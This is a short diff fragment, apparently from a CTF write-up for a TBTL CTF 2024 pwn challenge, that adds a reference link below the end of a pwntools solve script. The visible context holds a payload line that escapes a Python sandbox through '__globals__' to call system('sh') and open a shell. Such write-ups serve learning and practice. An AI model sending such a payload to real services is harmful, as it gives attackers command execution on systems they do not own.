@@ -94,3 +94,5 @@ p.sendline(f'[O.__globals__["system"]("sh")]'.encode())
 
 p.interactive()
 ```
+
+References: [TBTL CTF 2024 (Pwn)](https://ssongkit.tistory.com/808).
